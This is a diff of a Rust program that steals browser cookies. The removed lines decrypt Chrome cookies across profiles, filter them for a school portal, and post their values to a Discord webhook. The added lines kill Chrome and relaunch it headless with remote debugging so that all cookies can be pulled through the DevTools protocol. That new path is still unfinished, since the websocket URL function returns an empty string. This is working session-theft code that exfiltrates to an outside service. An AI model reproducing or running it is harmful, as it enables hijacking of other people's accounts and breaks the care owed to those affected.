@@ -1,133 +1,82 @@
+use std::process::{Command, Stdio};
 use std::{env, fs};
-
-use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
+//use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
 use dirs::home_dir;
 use dotenv::dotenv;
+use serde_json::json;
 use serde_json::Value;
 use terminal_size::{terminal_size, Height, Width};
 use webhook::client::WebhookClient;
+use websocket::{ClientBuilder, Message};
 
 const OS: &str = env::consts::OS;
+const DEBUG_PORT: u32 = 9222;
+const CHROME_PATH: &str = r#"C:\Program Files\Google\Chrome\Application\chrome.exe"#; // Update with your Chrome path
+const USER_DATA_DIR: &str = r#"C:\path\to\user\data\dir"#;
+#[derive(Debug)]
+struct TempCookie {
+    host_key: String,
+    encypter_value: String,
+}
 
 #[tokio::main]
-pub async fn main() -> miette::Result<()> {
+pub async fn main() -> Result<(), reqwest::Error> {
     dotenv().ok();
-
-    let discord_webhook_url =
-        std::env::var("DISCORD_WEBHOOK_URL").expect("DISCORD_WEBHOOK_URL must be set.");
-    let chromium = ChromiumBuilder::new(Browser::Chrome).build().await?;
-    let all_cookies = chromium.get_cookies_all().await?;
-    println!(
-        "{:?}",
-        all_cookies
-            .iter()
-            .filter(|c| c.host_key.contains("lvis"))
-            .collect::<Vec<_>>()
-    );
-    let info = chromium.info();
-    let local_state = fs::read_to_string(info.local_state()).unwrap();
-    let v: Value = serde_json::from_str(&local_state).unwrap();
-    let profiles_raw = v["profile"]["info_cache"].clone();
-    let mut profiles = Vec::new();
-    for (profile, _) in profiles_raw.as_object().unwrap() {
-        profiles.push(profile);
+    kill_chrome();
+    start_debugged_chrome();
+    let url = get_debug_ws_url().await;
+    let mut client = ClientBuilder::new(&url)
+        .unwrap()
+        .connect_insecure()
+        .unwrap();
+    let payload = json!({
+        "id": 1,
+        "method": "Network.getAllCookies"
+    })
+    .to_string();
+    client.send_message(&Message::text(payload)).unwrap();
+    if let Ok(message) = client.recv_message() {
+        println!("Received: {:?}", message);
     }
-    println!("{:?}", profiles);
-    let home_directory = home_dir().unwrap();
-    let home_directory = home_directory.to_str().unwrap();
-    let std_path = if env::consts::OS == "macos" {
-        format!(
-            "{}/Library/Application Support/Google/Chrome/",
-            home_directory
-        )
-    } else if env::consts::OS == "windows" {
-        format!(
-            r#"{}\AppData\Local\Google\Chrome\User Data"#,
-            home_directory
-        )
-    } else {
-        String::new()
-    };
-    for profile in profiles {
-        let path = if OS == "macos" {
-            format!("{std_path}/{profile}/Cookies")
-        } else if OS == "windows" {
-            format!(r#"{std_path}\{profile}\Network\Cookies"#)
-        } else {
-            String::new()
-        };
-        let chrome = ChromiumBuilder::new(Browser::Chrome)
-            .cookies_path(&path)
-            .clone()
-            .build()
-            .await?;
-        let cookies = chrome.get_cookies_all().await?;
-        let lvis_cookies = cookies
-            .iter()
-            .filter(|cookie| cookie.host_key.contains("lv"))
-            .collect::<Vec<_>>();
-        if lvis_cookies.is_empty() {
-            println!("No cookies for school portal in {profile}");
-        } else {
-            let client: WebhookClient = WebhookClient::new(&discord_webhook_url);
-            for cookie in &lvis_cookies {
-                client
-                    .send(|msg| {
-                        msg.content(&format!(
-                            "{} : {}",
-                            cookie.name,
-                            &cookie
-                                .decrypted_value
-                                .clone()
-                                .unwrap()
-                                .split("wB�I")
-                                .collect::<Vec<_>>()
-                                .join(" "),
-                        ))
-                    })
-                    .await
-                    .unwrap();
-            }
-            let size = terminal_size();
-            if let Some((Width(w), Height(_))) = size {
-                let w = w as usize;
-                println!("\n{:=^w$}", "");
-                println!("Cookies of school portal in {profile}:");
-                for cookie in lvis_cookies {
-                    println!(
-                        "{} : {}",
-                        cookie.name,
-                        &cookie
-                            .decrypted_value
-                            .clone()
-                            .unwrap()
-                            .split("wB�I")
-                            .collect::<Vec<_>>()
-                            .join(" ")
-                    );
-                }
-
-                println!("{:=^w$}\n", "");
-            } else {
-                println!("\n{:-^50}\n", "");
-                println!("Cookies of school portal in {profile}:");
-                for cookie in lvis_cookies {
-                    println!(
-                        "{} : {:?}",
-                        cookie.name,
-                        &cookie
-                            .decrypted_value
-                            .clone()
-                            .unwrap()
-                            .split("wB�I")
-                            .collect::<Vec<_>>()
-                            .join(" ")
-                    );
-                }
-                println!("\n{:-^50}\n", "");
-            }
-        }
-    }
-
+    let _ = client.shutdown();
+    kill_chrome();
     Ok(())
+}
+
+async fn get_debug_ws_url() -> String {
+    let body = reqwest::get(format!("http://localhost:{DEBUG_PORT}/json"))
+        .await
+        .unwrap()
+        .text()
+        .await
+        .unwrap();
+    dbg!("{:?}", body);
+    String::new()
+}
+
+fn kill_chrome() {
+    let output = Command::new("taskkill")
+        .args(&["/F", "/IM", "chrome.exe"])
+        .output()
+        .expect("Failed to execute command");
+
+    if !output.status.success() {
+        eprintln!("Failed to kill Chrome: {:?}", output.status);
+    }
+}
+
+fn start_debugged_chrome() {
+    let child = Command::new(CHROME_PATH)
+        .args(&[
+            &format!("--remote-debugging-port={}", DEBUG_PORT),
+            "--remote-allow-origins=*",
+            "--headless",
+            &format!("--user-data-dir={}", USER_DATA_DIR),
+        ])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .expect("Failed to start Chrome");
+
+    println!("Chrome started with PID: {}", child.id());
 }
